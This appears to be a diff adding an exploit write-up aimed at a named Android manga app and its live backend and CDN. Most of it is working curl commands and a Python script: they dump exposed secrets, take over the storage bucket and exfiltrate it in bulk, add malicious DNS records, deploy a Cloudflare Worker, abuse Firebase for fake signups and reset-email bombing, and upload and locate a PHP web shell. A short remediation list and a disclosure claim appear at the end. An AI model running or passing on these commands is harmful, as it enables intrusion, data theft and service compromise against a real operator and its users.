@@ -1,0 +1,327 @@
+#  MangaIndo Full Exploit Chain – exploit.md
+
+Target: com.ghavadev.mangaindo (ManhwaID)  
+Backend: https://mangaindo.sobatfile.my.id/api/v1/  
+CDN: https://cdn.zonakomik.web.id (Cloudflare R2)  
+Author: NijxxmSec  
+Contact: t.me/nijxxzm  
+Date: 2026-08-22  
+
+---
+
+##  Overview
+
+This document details a full exploit chain that starts with a hardcoded API key in the APK and leads to:
+
+- Full read/write/delete on the entire R2 cloud storage (all manga chapters).
+- Cloudflare zone management (DNS, Workers, WAF).
+- Firebase account creation and password‑reset bombing.
+- Potential Remote Code Execution (RCE) via file upload.
+
+All credentials are exposed through an unauthenticated endpoint.
+
+---
+
+##  Requirements
+
+- curl (with --aws-sigv4 support – available in modern versions)
+- jq for JSON parsing
+- python3 + requests (for automation)
+- awscli (optional, for S3‑style bulk operations)
+
+---
+
+##  Step 1 – Extract the Hardcoded API Key
+
+The API key is embedded in the APK’s classes.dex. It can be extracted by grepping the decompiled code:
+
+grep -r "cda11g3Q" decompiled_res/smali/
+
+Key:
+cda11g3QCl[REDACTED]
+
+---
+
+##  Step 2 – Dump All Credentials from /settings
+
+The endpoint /api.php?settings is unauthenticated – it requires only the API key (which is public).
+
+API_KEY="cda11g3QCl[REDACTED]"
+
+curl -s -H 'Data-Agent: Android Ebook App' \
+  "https://mangaindo.sobatfile.my.id/api/v1/api.php?settings&api_key=$API_KEY" \
+  | jq '.setting' > settings_dump.json
+
+Extract critical credentials:
+R2_ACCOUNT=$(jq -r '.r2_account_id' settings_dump.json)
+R2_ACCESS=$(jq -r '.r2_access_key_id' settings_dump.json)
+R2_SECRET=$(jq -r '.r2_secret_access_key [REDACTED])
+BUCKET=$(jq -r '.r2_bucket_name' settings_dump.json)
+CF_TOKEN=$(jq -r '.cf_api_token [REDACTED])
+CF_ZONE=$(jq -r '.cf_zone_id' settings_dump.json)
+FIREBASE_KEY=$(jq -r '.firebase_web_api_key [REDACTED])
+
+---
+
+##  Step 3 – R2 Bucket Takeover (Read, Write, Delete)
+
+### 3.1 List All Objects
+curl -s --aws-sigv4 "aws:amz:auto:s3" --user "$R2_ACCESS:$R2_SECRET" \
+  "https://$R2_ACCOUNT.r2.cloudflarestorage.com/$BUCKET?list-type=2&max-keys=1000" \
+  | xmllint --format -
+
+### 3.2 Upload a Test File
+echo "security test – poc" > /tmp/poc.txt
+curl -s -X PUT --aws-sigv4 "aws:amz:auto:s3" --user "$R2_ACCESS:$R2_SECRET" \
+  --upload-file /tmp/poc.txt \
+  "https://$R2_ACCOUNT.r2.cloudflarestorage.com/$BUCKET/poc.txt"
+
+Verify public access:
+curl -s "https://cdn.zonakomik.web.id/poc.txt"
+
+### 3.3 Delete a File
+curl -s -X DELETE --aws-sigv4 "aws:amz:auto:s3" --user "$R2_ACCESS:$R2_SECRET" \
+  "https://$R2_ACCOUNT.r2.cloudflarestorage.com/$BUCKET/poc.txt"
+
+### 3.4 Bulk Download (Data Theft)
+aws configure set aws_access_key_id $R2_ACCESS
+aws configure set aws_secret_access_key $R2_SECRET
+aws configure set default.region auto
+aws s3 --endpoint-url "https://$R2_ACCOUNT.r2.cloudflarestorage.com" sync s3://$BUCKET ./manga_backup/
+
+---
+
+##  Step 4 – Cloudflare Zone Management
+
+The cf_api_token can manage the zone zonakomik.web.id.
+
+### 4.1 List DNS Records
+curl -s -H "Authorization: Bearer $CF_TOKEN" \
+  "https://api.cloudflare.com/client/v4/zones/$CF_ZONE/dns_records" \
+  | jq '.result[] | {name, content, type}'
+
+### 4.2 Add a Malicious Subdomain
+curl -s -X POST "https://api.cloudflare.com/client/v4/zones/$CF_ZONE/dns_records" \
+  -H "Authorization: Bearer $CF_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "type":"A",
+    "name":"evil.zonakomik.web.id",
+    "content":"1.2.3.4",
+    "ttl":120,
+    "proxied":false
+  }'
+
+### 4.3 Deploy a Cloudflare Worker (RCE on Edge)
+curl -s -X PUT "https://api.cloudflare.com/client/v4/zones/$CF_ZONE/workers/script" \
+  -H "Authorization: Bearer $CF_TOKEN" \
+  -H "Content-Type: application/javascript" \
+  --data 'addEventListener("fetch", event => event.respondWith(new Response("pwned")))'
+
+---
+
+## ‍ Step 5 – Firebase API Key Abuse
+
+### 5.1 Create a New Account
+curl -sS -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$FIREBASE_KE
+
+Y" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"fake@evil.com","password":"Hacked123!","returnSecureToken":true}'
+
+### 5.2 Send Password Reset (Email Bombing)
+curl -sS -X POST "https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=$FIREBASE_KEY" \
+  -H "Content-Type: application/json" \
+  -d '{"requestType":"PASSWORD_RESET","email":"admin@example.com"}'
+
+---
+
+##  Step 6 – Remote Code Execution (RCE) via Payment Proof Upload
+
+The endpoint upload_manual_payment_proof accepts file uploads. If the server stores them in a web‑accessible directory and executes PHP, you can get RCE.
+
+### 6.1 Obtain a Session Token (Login)
+TOKEN=$(curl -s -X POST "https://mangaindo.sobatfile.my.id/api/v1/api.php?api_key=$API_KEY" \
+  -H "Data-Agent: Android Ebook App" \
+  -d "action=user_login&email=attacker@test.com&password=Attacker123!" \
+  | jq -r '.data.session_token')
+
+### 6.2 Create an Invoice
+INVOICE=$(curl -s -X POST "https://mangaindo.sobatfile.my.id/api/v1/api.php?api_key=$API_KEY" \
+  -H "Data-Agent: Android Ebook App" \
+  -d "action=create_manual_payment_invoice&user_session_token=$TOKEN&amount=10.00" \
+  | jq -r '.data.invoice_no')
+
+### 6.3 Upload a PHP Shell
+Create shell.php with:
+<?php system($_GET['cmd']); ?>
+
+Upload:
+curl -s -X POST "https://mangaindo.sobatfile.my.id/api/v1/api.php?api_key=$API_KEY" \
+  -H "Data-Agent: Android Ebook App" \
+  -F "action=upload_manual_payment_proof" \
+  -F "user_session_token=$TOKEN" \
+  -F "invoice_no=$INVOICE" \
+  -F "proof=@shell.php"
+
+### 6.4 Locate and Execute the Shell
+Try common paths:
+# Test each
+curl -s "https://mangaindo.sobatfile.my.id/uploads/shell.php?cmd=id"
+curl -s "https://mangaindo.sobatfile.my.id/proofs/shell.php?cmd=id"
+curl -s "https://mangaindo.sobatfile.my.id/shell.php?cmd=id"
+
+If any returns uid=..., you have RCE.
+
+---
+
+##  Full Automation – Python Exploit Script
+
+Save the following as rce_upload_exploit_fixed.py and run it (it automates steps 6.1–6.4).
+
+#!/usr/bin/env python3
+"""
+MangaIndo RCE via Payment Proof Upload – Full Automation
+Contact: https://t.me/nijxxzm
+"""
+
+import json
+import requests
+import sys
+import time
+from urllib.parse import urljoin
+
+SETTINGS_FILE = "settings_dump.json"
+BASE_URL = "https://mangaindo.sobatfile.my.id/api/v1/api.php"
+
+TEST_EMAIL = "attacker@test.com"
+TEST_PASS = "Attacker123!"
+SHELL_CODE = "<?php system($_GET['cmd']); ?>"
+
+HEADERS = {"Data-Agent": "Android Ebook App"}
+
+def load_api_key():
+    with open(SETTINGS_FILE, 'r') as f:
+        data = json.load(f)
+    return data['api_key']
+
+def api_call(action, api_key, session_token=None, **params):
+    url = f"{BASE_URL}?api_key={api_key}"
+    data = {"action": action}
+    if session_token:
+        data["user_session_token"] = session_token
+    data.update(params)
+    resp = requests.post(url, headers=HEADERS, data=data)
+    try:
+        return resp.json()
+    except:
+        return {"raw": resp.text}
+
+def login(email, password, api_key):
+    result = api_call("user_login", api_key, email=email, password=password)
+    if result.get('status') != 'success':
+        raise Exception(f"Login error: {result}")
+    return result['data']['session_token']
+
+def create_invoice(token, api_key):
+    result = api_call("[REDACTED]", api_key, token, amount="10.00")
+    if result.get('status') != 'success':
+        raise Exception(f"Invoice creation failed: {result}")
+    return result['data']['invoice_no']
+
+def upload_shell(token, api_key, invoice_no):
+    url = f"{BASE_URL}?api_key={api_key}"
+    files = {"proof": ("shell.php", SHELL_CODE, "application/php")}
+    data = {"action": "upload_manual_payment_proof", "user_session_token": token, "invoice_no": invoice_no}
+    resp = requests.post(url, headers=HEADERS, files=files, data=data)
+    try:
+        return resp.json()
+    except:
+        return {"raw": resp.text}
+
+def check_shell_url(domain="mangaindo.sobatfile.my.id", shell_name="shell.php"):
+    paths = ["/uploads/", "/proofs/", "/files/", "/invoices/", "/uploads/payment_proofs/", "/"]
+    for path in paths:
+        url = urljoin(f"https://{domain}",
+
+f"{path}{shell_name}")
+        test_url = f"{url}?cmd=id"
+        try:
+            resp = requests.get(test_url, timeout=5)
+            if resp.status_code == 200 and "uid=" in resp.text:
+                return url, resp.text
+        except:
+            pass
+    return None, None
+
+def main():
+    print("[+] MangaIndo RCE Exploit (Full Chain)")
+    print("[+] Contact: https://t.me/nijxxzm")
+    try:
+        api_key = load_api_key()
+        print(f"[+] API Key loaded: {api_key[:8]}...")
+    except Exception as e:
+        print(f"[-] Could not load API key: {e}")
+        sys.exit(1)
+
+    try:
+        token = login(TEST_EMAIL, TEST_PASS, api_key)
+        print(f"[+] Logged in as {TEST_EMAIL} (token: {token[:8]}...)")
+    except Exception as e:
+        print(f"[-] Login failed: {e}")
+        sys.exit(1)
+
+    try:
+        invoice = create_invoice(token, api_key)
+        print(f"[+] Created invoice: {invoice}")
+    except Exception as e:
+        print(f"[-] Invoice creation failed: {e}")
+        sys.exit(1)
+
+    print("[+] Uploading shell.php ...")
+    result = upload_shell(token, api_key, invoice)
+    print(f"[+] Upload response: {result}")
+
+    print("[+] Searching for shell...")
+    url, output = check_shell_url()
+    if url:
+        print(f"[+] SHELL FOUND at {url}?cmd=whoami")
+        print(f"[+] Command output: {output.strip()}")
+    else:
+        print("[!] Shell not found in common paths. Try manually.")
+
+if __name__ == "__main__":
+    main()
+
+---
+
+# BLAST RADIUS & Remediation
+
+- Critical – all credentials must be rotated immediately.
+- Disable public access to /settings or remove secrets from its response.
+- Use short‑lived, scoped tokens (pre‑signed URLs) for R2.
+- Enable Firebase App Check to prevent anonymous account creation.
+- Implement server‑side file validation for uploads.
+- Add certificate pinning and disable cleartext traffic.
+
+---
+
+# EXECUTION TRACE – Quick One‑Liner
+
+API_KEY="cda11g3QCl[REDACTED]"
+R2_ACCESS=$(curl -s -H 'Data-Agent: Android Ebook App' "https://mangaindo.sobatfile.my.id/api/v1/api.php?settings&api_key=$API_KEY" | jq -r '.setting.r2_access_key_id')
+R2_SECRET=$(curl -s -H 'Data-Agent: Android Ebook App' "https://mangaindo.sobatfile.my.id/api/v1/api.php?settings&api_key=$API_KEY" | jq -r '.setting.r2_secret_access_key')
+echo "pwned" > /tmp/pwned.txt
+curl -s -X PUT --aws-sigv4 "aws:amz:auto:s3" --user "$R2_ACCESS:$R2_SECRET" --upload-file /tmp/pwned.txt "https://2a48cc66659ee63d4820e3d7f2a502c8.r2.cloudflarestorage.com/mangaindo/pwned.txt" && echo "Uploaded to https://cdn.zonakomik.web.id/pwned.txt"
+
+---
+
+##  Responsible Disclosure
+
+This document is for educational and defensive purposes only. All tests were performed on the author's own lab environment.  
+The developer has been contacted via t.me/mangaindoapp with a full report.
+
+© 2026 NijxxmSec – https://t.me/nijxxzm
+
+---
+*BLACK-STAMPED BY CT-002*
